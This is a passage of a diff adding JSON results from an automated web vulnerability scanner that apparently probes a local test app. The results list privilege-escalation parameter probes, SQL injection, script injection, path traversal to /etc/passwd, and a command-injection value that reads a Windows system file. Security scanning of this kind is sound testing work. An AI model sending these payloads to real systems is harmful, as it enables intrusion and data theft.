+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "debug",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "privilege",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "auth",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "token",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "isAdmin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "debug",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "privilege",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "auth",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user",
+        "param": "token",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "isAdmin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "isAdmin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "debug",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "AI_JSON_INJECTION",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "account",
+        "payload": "&&${IFS}type${IFS}C:\\Windows\\win.ini",
+        "confidence_score": 65,
+        "severity": "MEDIUM"
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/continue-code/apply/?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/continue-code/apply/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/continue-code/apply/?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/continue-code/apply/?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/continue-code/apply/?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/v1/userinfo?alt=json&access_token=",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/v1/userinfo?alt=json&access_token=&q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/v1/userinfo?alt=json&access_token=",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/v1/userinfo?alt=json&access_token=&q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/v1/userinfo?alt=json&access_token=",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/v1/userinfo?alt=json&access_token=&file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/v1/userinfo?alt=json&access_token=",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/v1/userinfo?alt=json&access_token=&cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/v1/userinfo?alt=json&access_token=",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/v1/userinfo?alt=json&access_token=&search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/v2/auth?client_id=",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/v2/auth?client_id=&q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/v2/auth?client_id=",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/v2/auth?client_id=&q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/v2/auth?client_id=",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/v2/auth?client_id=&file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/v2/auth?client_id=",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/v2/auth?client_id=&cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/v2/auth?client_id=",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/v2/auth?client_id=&search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/continue-code-fixIt?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/continue-code-fixIt?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/continue-code-fixIt?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/continue-code-fixIt?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/continue-code-fixIt?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/contact",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/contact?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/contact",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/contact?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/contact",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/contact?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/contact",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/contact?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/contact",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/contact?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Addresss",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Addresss?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Addresss",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Addresss?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Addresss",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Addresss?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Addresss",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Addresss?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Addresss",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Addresss?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Recycles",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Recycles?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Recycles",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Recycles?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Recycles",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Recycles?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Recycles",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Recycles?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Recycles",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Recycles?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/admin",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/admin?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/admin",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/admin?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/admin",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/admin?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/admin",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/admin?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/admin",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/admin?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Quantitys",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Quantitys?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Quantitys",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Quantitys?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Quantitys",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Quantitys?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Quantitys",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Quantitys?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Quantitys",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Quantitys?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Complaints",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Complaints?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Complaints",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Complaints?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Complaints",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Complaints?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Complaints",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Complaints?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Complaints",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Complaints?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Users",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Users?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Users",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Users?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Users",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Users?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Users",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Users?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Users",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Users?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/user?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
